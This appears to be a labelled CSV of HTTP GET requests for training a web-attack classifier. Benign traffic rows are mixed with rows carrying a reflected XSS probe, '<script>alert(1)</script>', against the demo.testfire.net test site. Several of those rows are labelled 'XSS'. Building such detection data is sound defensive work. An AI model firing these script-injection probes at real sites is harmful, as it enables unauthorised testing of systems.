GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.219,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/106.206.77.3,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/106.206.77.3,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
